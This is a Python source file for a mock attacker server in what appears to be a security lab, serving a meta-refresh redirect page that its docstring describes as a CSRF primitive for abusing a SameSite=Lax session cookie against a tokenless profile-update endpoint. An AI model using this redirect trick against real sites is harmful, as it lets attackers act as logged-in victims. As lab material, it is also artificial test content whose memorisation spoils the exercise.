# SPDX-License-Identifier: MIT
"""Attacker origin (stdlib). Serves GET /go?to=<url> as a page that top-level
meta-refreshes the visitor to <url>. This is the CSRF primitive: a cross-site
TOP-LEVEL GET navigation carries the victim's SameSite=Lax session cookie, so
pointing it at the app's `/profile/update?bio=...` (no CSRF token) sets the admin's
bio as the admin. A stand-in for "a page the attacker hosts and lures the admin
to". Mock external infra (stdlib, no deps), not the gated lab app.

Why GET/meta-refresh and not a POST form: a cross-site POST does NOT carry a
SameSite=Lax cookie (only top-level SAFE-method navigations do), so on this
HTTP/Lax lab the update must be reachable via GET. See the app SOLUTION.
"""
from __future__ import annotations

import html
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlparse


class Handler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:  # noqa: N802
        parsed = urlparse(self.path)
        if parsed.path == "/health":
            self._send(200, "text/plain", b"ok")
            return
        if parsed.path == "/go":
            to = (parse_qs(parsed.query).get("to") or [""])[0]
            # html.escape makes the URL attribute-safe; the browser decodes entities
            # (e.g. &amp;->&) before navigating, so the destination stays intact.
            page = (
                "<!doctype html><html><head>"
                "<meta http-equiv=\"refresh\" content=\"0;url=%s\">"
                "</head><body>redirecting…</body></html>"
            ) % html.escape(to, quote=True)
            self._send(200, "text/html", page.encode("utf-8"))
            return
        self._send(404, "text/plain", b"not found")

    def log_message(self, fmt: str, *args) -> None:
        return

    def _send(self, code: int, ctype: str, body: bytes) -> None:
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


def main() -> None:
    ThreadingHTTPServer(("0.0.0.0", 8080), Handler).serve_forever()


if __name__ == "__main__":
    main()
